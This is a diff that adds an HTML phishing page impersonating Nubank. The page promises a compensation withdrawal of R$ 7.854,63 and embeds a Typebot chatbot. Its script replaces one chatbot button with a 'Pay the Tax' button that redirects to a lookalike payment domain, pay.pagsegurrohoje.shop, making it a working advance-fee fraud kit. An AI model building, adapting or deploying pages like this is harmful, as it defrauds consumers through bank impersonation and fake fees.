@@ -1,0 +1,131 @@
+
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <script
+  src="../../../cdn.utmify.com.br/scripts/utms/latest.js"
+  data-utmify-prevent-subids
+  async
+  defer
+></script>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Saque da Indenização</title>
+  <script src="https://cdn.tailwindcss.com/"></script>
+</head>
+
+<body class="bg-[#831BD1] min-h-screen flex flex-col">
+
+  <header class="bg-white px-4 shadow-md">
+    <div class="max-w-[1200px] mx-auto flex items-center gap-6">
+      <img src="assets/logo.svg" alt="Nubank" class="h-16 w-auto" />
+    </div>
+  </header>
+
+  <main class="flex-1 px-4 py-2">
+    <div class="flex flex-col">
+      <main>
+        <div class="max-h-min">
+          <div class="px-0.5 pb-[0.6rem]">
+            <div class="bg-white border border-gray-300 rounded-md w-full h-[calc(100vh-80px)] overflow-hidden">
+              <div class="px-4 pt-4 pb-0 text-center max-w-md mx-auto text-black">
+                <p class="text-base">
+                  <span>Olá, </span>
+                  <span class="text-black font-bold">USUáRIO!</span>
+                </p>
+                <p class="mt-1 text-sm">
+                  Responda as perguntas abaixo para realizar<br>seu saque de <span>R$ 7.854,63</span>
+                </p>
+              </div>
+        <script type="module">
+          import Typebot from 'https://cdn.jsdelivr.net/npm/@typebot.io/js@0.3.86/dist/web.js';
+
+          Typebot.initStandard({
+            typebot: "nub",
+            apiHost: "https://viewer-production-2123.up.railway.app",
+          });
+        </script>
+
+        <script>
+          document.addEventListener("DOMContentLoaded", function() {
+              console.log("DOM completamente carregado e analisado");
+              
+              // Esperar um pouco para garantir que o typebot seja carregado
+              setTimeout(observarTypebot, 1000);
+              
+              // Tentar novamente após 3 segundos se não funcionar na primeira vez
+              setTimeout(observarTypebot, 3000);
+              
+              // E uma última tentativa após 5 segundos
+              setTimeout(observarTypebot, 5000);
+          });
+          
+          function observarTypebot() {
+              var shadowHost = document.querySelector("typebot-standard");
+              if (!shadowHost) {
+                  console.log("Elemento typebot-standard não encontrado ainda");
+                  return;
+              }
+              
+              if (!shadowHost.shadowRoot) {
+                  console.log("Shadow DOM ainda não disponível");
+                  return;
+              }
+              
+              console.log("Typebot encontrado, configurando observer");
+              substituirElemento(shadowHost);
+          }
+
+          function substituirElemento(shadowHost) {
+              var shadowRoot = shadowHost.shadowRoot;
+              var observer = new MutationObserver(function(mutations) {
+                  mutations.forEach(function(mutation) {
+                      mutation.addedNodes.forEach(function(node) {
+                          console.log("Node adicionado:", node);
+
+                          // Procura o contêiner de botões pelo novo seletor fornecido
+                          if (node.nodeType === 1 && node.matches("div[data-blockid='ryzt2pfuuw8c53akf8frzm9w']")) {
+                              console.log("Encontrou o contêiner de botões!");
+                              
+                              // Procura o slot que contém os botões
+                              var buttonList = node.querySelector("div[data-slot='list']");
+                              if (buttonList) {
+                                  // Encontra o botão específico
+                                  var oldButton = buttonList.querySelector("button[data-itemid='c7r8hbf6vc999pis0l7szqpo']");
+                                  if (oldButton) {
+                                      console.log("Botão encontrado, substituindo...");
+                                      
+                                      // Cria um novo botão com o mesmo estilo mas diferente texto e ação
+                                      var newButton = document.createElement("button");
+                                      newButton.className = oldButton.className;
+                                      newButton.textContent = "Efetuar Pagamento do Imposto";
+                                      newButton.setAttribute("data-replaced", "true"); // Marca para evitar substituições duplicadas
+                                      
+                                      // Aplica estilo personalizado (mantendo cores roxas do site)
+                                      newButton.style.cssText = "background-color: #831BD1; color: white; border: none; border-radius: 4px; padding: 10px 20px; cursor: pointer; font-weight: bold;";
+                                      
+                                      // Adiciona o evento de clique para redirecionar
+                                      newButton.addEventListener("click", function() {
+                                          console.log("Botão clicado, redirecionando...");
+                                          window.location.href = "https://pay.pagsegurrohoje.shop/PyE2Zy8yvLN3qRb";
+                                      });
+                                      
+                                      // Substitui o botão antigo pelo novo
+                                      oldButton.parentNode.replaceChild(newButton, oldButton);
+                                      console.log("Botão substituído com sucesso!");
+                                      
+                                      // Para de observar depois de substituir
+                                      observer.disconnect();
+                                  }
+                              }
+                          }
+                      });
+                  });
+              });
+              
+              observer.observe(shadowRoot, { childList: true, subtree: true });
+              console.log("Observando shadowRoot de typebot-standard");
+          }
+        </script>
+
+<typebot-standard></typebot-standard>
